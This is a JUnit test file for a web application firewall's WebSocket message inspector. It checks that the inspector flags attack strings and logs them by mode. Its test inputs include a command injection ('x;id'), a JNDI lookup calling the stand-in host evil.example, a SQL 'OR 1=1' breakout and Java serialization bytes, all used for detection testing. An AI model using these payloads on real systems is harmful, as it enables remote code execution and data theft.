package com.aiwaf.core;

import org.junit.jupiter.api.Test;

import java.util.ArrayList;
import java.util.List;
import java.util.logging.Handler;
import java.util.logging.LogRecord;
import java.util.logging.Logger;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNull;

class AiwafMessageCoreTest {
    @Test
    void messagesAreCheckedLikeBodies() {
        AiwafConfig config = new AiwafConfig();
        assertEquals("rce_command_injection", AiwafMessageCore.inspect("x;id", config));
        assertEquals("rce_jndi_lookup", AiwafMessageCore.inspect("{\"q\": \"${jndi:ldap://evil.example/a}\"}", config));
        assertEquals("sql_breakout_numeric", AiwafMessageCore.inspect("1 OR 1=1", config));
        assertEquals("rce_serialized_object", AiwafMessageCore.inspect(new byte[]{(byte) 0xac, (byte) 0xed, 0, 5, 's', 'r'}, config));
        assertNull(AiwafMessageCore.inspect("{\"q\": \"O'Reilly\"}", config));
        assertNull(AiwafMessageCore.inspect((String) null, config));
        assertNull(AiwafMessageCore.inspect(new byte[0], config));
        config.requestBodyInspectionBytes = 8;
        assertEquals("payload_inspection_limit", AiwafMessageCore.inspect("a".repeat(100), config));
        assertEquals(1009, AiwafMessageCore.closeCode("payload_inspection_limit"));
        assertEquals(1008, AiwafMessageCore.closeCode("rce_command_injection"));
    }

    @Test
    void checkLogsTheRuleAndFollowsTheMode() {
        List<String> logged = new ArrayList<>();
        Handler handler = new Handler() {
            @Override public void publish(LogRecord record) { logged.add(record.getMessage()); }
            @Override public void flush() {}
            @Override public void close() {}
        };
        Logger logger = Logger.getLogger("com.aiwaf.websocket");
        logger.addHandler(handler);
        try {
            AiwafConfig config = new AiwafConfig();
            assertEquals("rce_command_injection", AiwafMessageCore.check("x;id", config, "/chat"));
            assertEquals("{\"event\":\"aiwaf.websocket\",\"mode\":\"block\",\"path\":\"/chat\",\"rule\":\"rce_command_injection\"}", logged.get(0));
            assertFalse(logged.get(0).contains("x;id"));
            config.sqlInjectionMode = "monitor";
            assertNull(AiwafMessageCore.check("x;id", config, null));
            assertEquals(2, logged.size());
            config.sqlInjectionMode = "off";
            assertNull(AiwafMessageCore.check("x;id", config, "/chat"));
            assertEquals(2, logged.size());
            config.sqlInjectionMode = null;
            assertEquals("rce_serialized_object", AiwafMessageCore.check(new byte[]{(byte) 0xac, (byte) 0xed, 0, 5}, config, "/b"));
            assertNull(AiwafMessageCore.check("hello", config, "/chat"));
        } finally {
            logger.removeHandler(handler);
        }
    }
}
